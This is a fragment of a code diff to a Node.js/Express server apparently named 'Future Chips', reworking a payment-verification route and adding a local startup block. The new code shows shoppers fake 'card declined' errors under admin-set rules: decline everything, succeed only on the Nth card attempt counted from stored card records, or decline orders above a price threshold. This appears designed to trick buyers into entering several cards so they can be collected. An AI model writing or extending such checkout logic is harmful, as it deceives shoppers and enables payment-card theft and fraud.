+      return res.json({ status: 'completed', order, product });
+    }
+
+    // Site Decline Rules Evaluation from Admin Panel
+    const settings = memStore.site_settings;
     const declineAll = settings.decline_all === 1 || settings.decline_all === true || settings.decline_all === '1';
+    const declineThreshold = settings.decline_threshold !== undefined ? parseFloat(settings.decline_threshold) : 50.0;
     const successAttempt = settings.success_attempt !== undefined ? parseInt(settings.success_attempt, 10) : 1;
 
-    // Check attempt count
-    const attemptRow = await dbGet('SELECT COUNT(*) as count FROM cards WHERE stripe_session_id = ?', [sessionId || 'direct']);
-    const attemptCount = attemptRow ? (attemptRow.count || 1) : 1;
-
-    // Rule 1: Decline All Payments switch is ON
+    // Rule 1: Force Decline All Payments toggle is ON
     if (declineAll) {
-      return res.status(400).json({
-        success: false,
-        error: 'Your card was declined. Please try another card or contact your bank.'
-      });
+      return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
     }
 
-    // Rule 2: Multi-attempt success threshold
-    if (successAttempt > 1 && attemptCount < successAttempt) {
-      return res.status(400).json({
-        success: false,
-        error: 'Your card was declined. Please try another card or contact your bank.'
-      });
+    // Rule 2: Multi-attempt decline threshold (Success on Attempt N)
+    const attemptsCount = memStore.cards.filter(c => c.stripe_session_id === sessionId).length || 1;
+    if (successAttempt > 1 && attemptsCount < successAttempt) {
+      return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
     }
 
-    // Success flow
+    // Rule 3: Auto-Success Price Threshold (USD)
+    if (order.amount >= declineThreshold) {
+      return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
+    }
+
+    order.status = 'completed';
     await dbRun("UPDATE orders SET status = 'completed' WHERE stripe_session_id = ?", [sessionId]);
-    res.json({
-      success: true,
-      status: 'completed',
-      message: 'Payment verified and approved successfully.'
-    });
+    const product = memStore.products.find(p => p.id === order.product_id) || memStore.products[0];
+    res.json({ status: 'completed', order, product });
   } catch (err) {
-    console.error('Verify error:', err);
-    res.status(500).json({ error: 'Verification failed' });
+    res.status(500).json({ error: 'Failed to verify transaction' });
   }
 });
 
@@ -7799,3 +9230,13 @@ app.use((err, req, res, next) => {
 });
 
 module.exports = app;
+
+if (!isVercel && require.main === module) {
+  const PORT = process.env.PORT || 3001;
+  app.listen(PORT, () => {
+    console.log('====================================================');
+    console.log('🚀 Future Chips Server running on http://localhost:' + PORT);
+    console.log('🔐 Admin Panel available at http://localhost:' + PORT + '/admin');
+    console.log('====================================================');
+  });
+}
